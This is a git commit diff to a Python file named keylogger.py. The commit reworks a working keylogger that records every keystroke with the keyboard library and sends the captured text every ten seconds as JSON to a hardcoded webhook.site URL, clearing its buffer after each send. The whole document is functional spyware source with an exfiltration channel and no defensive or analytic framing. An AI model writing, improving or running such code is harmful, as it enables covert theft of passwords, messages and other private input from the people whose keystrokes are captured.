aa7f7d1e813bae9677f1d0f76a5628eae8cca622
Frost1801 <sergio.cibecchini@gmail.com>
2024-12-09 14:33:02 +0100

    reworked function to reset text after sending data

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,4 @@
-from pynput import keyboard
+import keyboard
 import requests
 import json
 import threading
@@ -8,36 +8,21 @@ webhookUrl = "https://webhook.site/5eb26f68-3adb-457a-9706-adf63da9b55c"
 time_interval = 10
 
 def send_post_req():
+    global text
     try:
         payload = json.dumps({"Keyboard input": text})
         r = requests.post(f"{webhookUrl}", data=payload, headers={"Content-Type": "application/json"})
+        text = ""  # Reset the text after sending
         timer = threading.Timer(time_interval, send_post_req)
         timer.start()
     except:
         print("Couldn't complete request!")
 
-def on_press(key):
+def log_keys(e):
     global text
-    if key == keyboard.Key.enter:
-        text += "\n"
-    elif key == keyboard.Key.tab:
-        text += "\t"
-    elif key == keyboard.Key.space:
-        text += " "
-    elif key == keyboard.Key.shift:
-        pass
-    elif key == keyboard.Key.backspace and len(text) == 0:
-        pass
-    elif key == keyboard.Key.backspace and len(text) > 0:
-        text = text[:-1]
-    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-        pass
-    elif key == keyboard.Key.esc:
-        return False
-    else:
-        text += str(key).strip("'")
+    text += e.name if len(e.name) == 1 else f"[{e.name}]"
 
-with keyboard.Listener(
-    on_press=on_press) as listener:
-    send_post_req()
-    listener.join()
+keyboard.on_press(log_keys)
+
+send_post_req()
+keyboard.wait()  # Keeps the program running
